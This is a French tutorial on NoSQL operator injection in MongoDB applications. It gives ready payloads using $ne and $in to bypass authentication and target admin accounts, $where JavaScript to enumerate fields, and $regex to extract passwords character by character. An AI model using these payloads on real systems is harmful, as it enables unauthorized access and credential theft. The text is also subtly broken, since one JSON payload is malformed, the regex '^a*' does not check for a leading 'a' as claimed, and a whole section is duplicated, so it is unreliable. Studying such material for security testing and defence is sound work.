Les opérateurs de requête, permettent de spécifier les conditions que les données doivent remplir pour être incluses dans le résultat de la requête. 

- `$where` - Correspond aux documents qui satisfont une expression JavaScript.
- `$ne` - Correspond à toutes les valeurs qui ne sont pas égales à une valeur spécifiée.
- `$in` - Correspond à toutes les valeurs spécifiées dans un tableau.
- `$regex` - Sélectionne les documents dont les valeurs correspondent à une expression régulière spécifiée.

Vous pourrez peut-être injecter des opérateurs de requête pour manipuler les requêtes NoSQL. Pour ce faire, 

- Soumettez systématiquement différents opérateurs à une série d'entrées utilisateur, puis examinez les réponses pour détecter les messages d'erreur ou autres modifications. 

## Soumission d’opérateurs de requête 

**Dans les messages json**

Vous pouvez insérer des opérateurs de requête en tant qu'objets imbriqués. Par exemple, `{"username":"wiener"}` devient :

```sh
{"username":{"$ne":"invalid"}}
```

**Dans les paramètres d'URL**

Par exemple, `username=wiener` devient :

```sh
username[$ne]=invalid
```

Si cela ne fonctionne pas, vous pouvez essayer ce qui suit : 

1. Convertir la méthode de requête de `GET` à `POST`.
2. Changer le `Content-Type` en-tête vers `application/json`.
3. Ajoutez `JSON` au corps du message.
4. `Injectez des opérateurs de requête` dans le JSON.

> You can use the Content Type Converter extension to automatically convert the request method and change a URL-encoded POST request to sh. 


## Détection de l'injection d'opérateur dans MongoDB 

Considérons une application vulnérable qui accepte un nom d'utilisateur et un mot de passe dans le corps d'un POST demande:

```sh
{"username":"wiener", "password":"peter"}
```

- Testez chaque entrée avec une gamme d’opérateurs. Par exemple, pour tester si l'entrée du nom d'utilisateur traite l'opérateur de requête, vous pouvez essayer l'injection suivante :

```sh
{"username":{"$ne":"invalid"}"password":"peter"}
```

> Si L'opérateur `$ne` est appliqué, cela interroge tous les utilisateurs dont le nom d'utilisateur `n'est pas égal à invalid`.

> Si les entrées du nom d'utilisateur et du mot de passe traitent l'opérateur, il peut être possible de [contourner l'authentification](./Bypassing%20Authentication.md) à l'aide de la charge utile suivante :

```sh
{"username":{"$ne":"invalid"}, "password": {"$ne":"invalid"}}
```

Cette requête renvoie toutes les informations de connexion dont le nom d'utilisateur et le mot de passe ne sont pas égaux à invalid. Par conséquent, vous êtes connecté à l’application en tant que premier utilisateur de la collection.

Pour cibler un compte, vous pouvez créer inclut un nom d'utilisateur connu ou deviné

```sh
{   
    "username":{
        "$in":["admin","administrator","superadmin"]
    },
    "password":{"$ne":""}
}
```

## Exploiter l'injection d'opérateur NoSQL pour extraire des données 

Même si la requête d'origine ne permet pas d'exécuter du JavaScript arbitraire, il est possible d'injecter un opérateur spécifique. En utilisant des conditions booléennes, vous pourrez tester si l'application exécute le JavaScript que vous avez injecté via cet opérateur.

**Injection d'opérateurs dans MongoDB**

Considérons une application vulnérable qui accepte le nom d'utilisateur et le mot de passe dans le corps d'une demande `POST`:

```sh
{"username":"wiener","password":"peter"}
```

Pour tester si vous pouvez injecter des opérateurs, vous pouvez essayer d'ajouter l'opérateur `$where` comme paramètre supplémentaire, puis envoyez une requête où la condition est évaluée comme fausse et une autre qui est évaluée comme vraie. Par exemple:

```sh
{"username":"wiener", "password":"peter", "$where":"0"}
```
```sh
{"username":"wiener", "password":"peter", "$where":"1"}
```

> S'il existe une différence entre les réponses, cela peut indiquer que l'expression JavaScript dans la clause `$where` est en cours d’évaluation. 

**Extraction des noms de champs**

Si vous avez injecté un opérateur qui vous permet d'exécuter JavaScript, vous pourrez peut-être utiliser la méthode `keys()` pour extraire le nom des champs de données. Par exemple, vous pouvez soumettre la charge utile suivante :

```sh
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

> Ceci inspecte le premier champ de données de l'objet utilisateur et renvoie le premier caractère du nom du champ. Cela vous permet d'extraire le nom du champ caractère par caractère.

**Exfiltration de données à l'aide d'opérateurs**

Alternativement, vous pourrez peut-être extraire des données à l'aide d'opérateurs qui ne vous permettent pas d'exécuter JavaScript. Par exemple, vous pourrez peut-être utiliser l'opérateur `$regex` pour extraire les données caractère par caractère.

Considérons une application vulnérable qui accepte un nom d'utilisateur et un mot de passe dans le corps d'une demande `POST`. Par exemple:

```sh
{"username":"myuser","password":"mypass"}
```

Vous pouvez commencer par tester si l'opérateur `$regex` est traité comme suit :

```sh
{"username":"admin","password":{"$regex":"^.*"}}
```

> Si la réponse à cette demande est différente de celle que vous recevez lorsque vous soumettez un mot de passe incorrect, cela indique que l'application peut être vulnérable. 

Vous pouvez utiliser l'opérateur `$regex` pour extraire les données caractère par caractère. Par exemple, la charge utile suivante vérifie si le mot de passe commence par un a:

```sh
{"username":"admin","password":{"$regex":"^a*"}}
```

**Exfiltration de données à l'aide d'opérateurs**

Alternativement, vous pourrez peut-être extraire des données à l'aide d'opérateurs qui ne vous permettent pas d'exécuter JavaScript. Par exemple, vous pourrez peut-être utiliser le $regex opérateur pour extraire les données caractère par caractère.

Considérons une application vulnérable qui accepte un nom d'utilisateur et un mot de passe dans le corps d'un `POST` demande. Par exemple:

```json
{"username":"myuser","password":"mypass"}
```

Vous pouvez commencer par tester si l'opérateur `$regex` est traité comme suit :

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

Si la réponse à cette demande est différente de celle que vous recevez lorsque vous soumettez un mot de passe incorrect, cela indique que l'application peut être vulnérable. Vous pouvez utiliser l'opérateur `$regex` pour extraire les données caractère par caractère. Par exemple, la charge utile suivante vérifie si le mot de passe commence par un a:

```json
{"username":"admin","password":{"$regex":"^a*"}}
```